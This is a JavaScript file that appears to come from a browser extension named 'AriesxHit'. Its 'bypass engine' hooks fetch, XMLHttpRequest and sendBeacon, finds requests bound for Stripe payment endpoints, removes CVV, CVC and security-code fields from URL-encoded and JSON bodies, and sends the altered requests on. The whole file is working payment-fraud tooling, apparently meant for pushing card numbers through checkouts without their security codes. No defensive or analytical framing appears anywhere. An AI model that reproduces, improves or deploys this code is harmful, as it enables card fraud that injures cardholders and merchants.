// ===================================
// BYPASS.JS - Core Bypass Engine
// CVV Removal from Stripe Requests
// Location: scripts/core/bypass.js
// ===================================

(function() {
  'use strict';

  if (window.__ARIESXHIT_BYPASS__) return;
  window.__ARIESXHIT_BYPASS__ = true;

  let bypassActive = false;
  let bypassCount = 0;

  console.log('[AriesxHit] Bypass engine loaded');

  // ==================== BYPASS CONTROL ====================

  // Listen for bypass toggle from content script
  window.addEventListener('message', (event) => {
    if (event.data?.source === 'ariesxhit-bypass-control') {
      bypassActive = event.data.active;
      console.log('[AriesxHit] Bypass mode:', bypassActive ? 'ON' : 'OFF');
      
      // Notify that bypass state changed
      notifyBypassState(bypassActive);
    }
  });

  // ==================== STRIPE DETECTION ====================

  const STRIPE_DOMAINS = ['stripe.com', 'stripe.network'];
  const STRIPE_PATHS = ['/v1/payment_methods', '/v1/tokens', '/v1/sources', '/v1/setup_intents'];

  function isStripeRequest(url) {
    if (!url) return false;
    try {
      const u = new URL(url, location.href);
      return STRIPE_DOMAINS.some(d => u.hostname.includes(d)) || 
             STRIPE_PATHS.some(p => u.pathname.includes(p));
    } catch {
      return STRIPE_DOMAINS.some(d => url.includes(d)) || 
             STRIPE_PATHS.some(p => url.includes(p));
    }
  }

  // ==================== CVV REMOVAL LOGIC ====================

  function removeCVVFromBody(bodyStr) {
    if (!bodyStr || !bypassActive) {
      return { modified: false, body: bodyStr };
    }

    let result = bodyStr;
    let modified = false;

    // Pattern 1: URL-encoded CVV parameters
    const cvvPatterns = [
      /card%5Bcvc%5D=[^&]*/gi,
      /card%5Bcvv%5D=[^&]*/gi,
      /cvc=[^&]*/gi,
      /cvv=[^&]*/gi,
      /card\[cvc\]=[^&]*/gi,
      /card\[cvv\]=[^&]*/gi,
      /card_cvc=[^&]*/gi,
      /card_cvv=[^&]*/gi
    ];

    for (const pattern of cvvPatterns) {
      const before = result;
      result = result.replace(pattern, '');
      if (before !== result) modified = true;
    }

    // Pattern 2: Clean up double ampersands
    result = result.replace(/&&+/g, '&');
    result = result.replace(/&$/g, '');
    result = result.replace(/^\?&/g, '?');

    // Pattern 3: JSON body handling
    try {
      if (result.startsWith('{') || result.startsWith('%7B')) {
        let jsonStr = result.startsWith('%') ? decodeURIComponent(result) : result;
        let obj = JSON.parse(jsonStr);

        function removeCVVKeys(o) {
          if (typeof o !== 'object' || !o) return;
          
          const cvvKeys = ['cvc', 'cvv', 'card_cvc', 'card_cvv', 'security_code'];
          
          for (const key of cvvKeys) {
            if (key in o) {
              delete o[key];
              modified = true;
            }
          }

          // Check nested card object
          if (o.card && typeof o.card === 'object') {
            for (const key of cvvKeys) {
              if (key in o.card) {
                delete o.card[key];
                modified = true;
              }
            }
          }

          // Check payment_method_data
          if (o.payment_method_data && typeof o.payment_method_data === 'object') {
            removeCVVKeys(o.payment_method_data);
          }

          // Recursively check all nested objects
          for (const v of Object.values(o)) {
            if (typeof v === 'object' && v !== null) {
              removeCVVKeys(v);
            }
          }
        }

        removeCVVKeys(obj);

        if (modified) {
          result = JSON.stringify(obj);
          if (bodyStr.startsWith('%')) {
            result = encodeURIComponent(result);
          }
        }
      }
    } catch (e) {
      // Not JSON, continue with string result
    }

    return { modified, body: result };
  }

  // ==================== FETCH INTERCEPTION ====================

  const originalFetch = window.fetch;

  window.fetch = async function(input, init) {
    let url, method, body, headers, credentials, mode;

    // Extract request details
    if (input instanceof Request) {
      url = input.url;
      method = input.method;
      headers = new Headers(input.headers);
      credentials = input.credentials;
      mode = input.mode;
      
      if (input.body) {
        try {
          const clone = input.clone();
          body = await clone.text();
        } catch (e) {
          body = null;
        }
      }
    } else {
      url = String(input || '');
      method = init?.method || 'GET';
      headers = init?.headers ? new Headers(init.headers) : new Headers();
      body = init?.body;
      credentials = init?.credentials;
      mode = init?.mode;
    }

    // Convert body to string
    if (body && typeof body !== 'string') {
      if (body instanceof URLSearchParams) {
        body = body.toString();
      } else if (body instanceof FormData) {
        const params = new URLSearchParams();
        body.forEach((v, k) => params.append(k, v));
        body = params.toString();
      } else if (body instanceof ArrayBuffer) {
        body = new TextDecoder().decode(body);
      } else {
        try {
          body = JSON.stringify(body);
        } catch (e) {
          body = null;
        }
      }
    }

    // Check if Stripe request with body
    if (isStripeRequest(url) && body && method !== 'GET') {
      const result = removeCVVFromBody(body);

      if (result.modified) {
        bypassCount++;
        console.log('[AriesxHit] 🔓 CVV removed from fetch request');
        
        // Notify content script
        notifyBypass(url, 'fetch');

        // Update headers
        const newHeaders = {};
        headers.forEach((value, key) => {
          newHeaders[key] = value;
        });
        newHeaders['Content-Length'] = result.body.length.toString();

        const newInit = {
          method: method,
          headers: newHeaders,
          body: result.body,
          credentials: credentials || 'same-origin',
          mode: mode || 'cors'
        };

        return originalFetch.call(window, url, newInit);
      }
    }

    // Continue normally
    if (input instanceof Request) {
      return originalFetch.call(window, input, init);
    }
    return originalFetch.call(window, url, init || {});
  };

  // ==================== XHR INTERCEPTION ====================

  const XHR = XMLHttpRequest;
  const originalOpen = XHR.prototype.open;
  const originalSend = XHR.prototype.send;

  XHR.prototype.open = function(method, url) {
    this._ariesUrl = String(url || '');
    this._ariesMethod = method;
    return originalOpen.apply(this, arguments);
  };

  XHR.prototype.send = function(body) {
    const url = this._ariesUrl;
    const method = this._ariesMethod;

    if (isStripeRequest(url) && body && method !== 'GET') {
      let bodyStr = body;
      
      // Convert body to string
      if (typeof body !== 'string') {
        if (body instanceof URLSearchParams) {
          bodyStr = body.toString();
        } else if (body instanceof FormData) {
          const params = new URLSearchParams();
          body.forEach((v, k) => params.append(k, v));
          bodyStr = params.toString();
        } else if (body instanceof ArrayBuffer) {
          bodyStr = new TextDecoder().decode(body);
        } else {
          try {
            bodyStr = JSON.stringify(body);
          } catch (e) {
            bodyStr = null;
          }
        }
      }

      if (bodyStr) {
        const result = removeCVVFromBody(bodyStr);
        
        if (result.modified) {
          bypassCount++;
          console.log('[AriesxHit] 🔓 CVV removed from XHR request');
          
          notifyBypass(url, 'xhr');

          return originalSend.call(this, result.body);
        }
      }
    }

    return originalSend.apply(this, arguments);
  };

  // ==================== SENDBEACON INTERCEPTION ====================

  if (navigator.sendBeacon) {
    const originalBeacon = navigator.sendBeacon.bind(navigator);
    
    navigator.sendBeacon = function(url, data) {
      if (isStripeRequest(url) && data) {
        let bodyStr = data;
        
        if (data instanceof URLSearchParams) {
          bodyStr = data.toString();
        } else if (data instanceof FormData) {
          const params = new URLSearchParams();
          data.forEach((v, k) => params.append(k, v));
          bodyStr = params.toString();
        } else if (typeof data !== 'string') {
          try {
            bodyStr = JSON.stringify(data);
          } catch (e) {
            bodyStr = null;
          }
        }

        if (bodyStr) {
          const result = removeCVVFromBody(bodyStr);
          
          if (result.modified) {
            bypassCount++;
            console.log('[AriesxHit] 🔓 CVV removed from beacon request');
            
            notifyBypass(url, 'beacon');

            return originalBeacon(url, result.body);
          }
        }
      }

      return originalBeacon(url, data);
    };
  }

  // ==================== NOTIFICATION ====================

  function notifyBypass(url, type) {
    window.postMessage({
      source: 'ariesxhit-bypass',
      type: 'cvv_removed',
      url: url,
      method: type,
      count: bypassCount
    }, '*');
  }

  function notifyBypassState(active) {
    window.postMessage({
      source: 'ariesxhit-bypass',
      type: 'state_changed',
      active: active
    }, '*');
  }

  // ==================== STATS ====================

  window.__ARIESXHIT_BYPASS_STATS__ = function() {
    return {
      bypassCount: bypassCount,
      active: bypassActive
    };
  };

  console.log('[AriesxHit] ✅ Bypass engine ready');

})();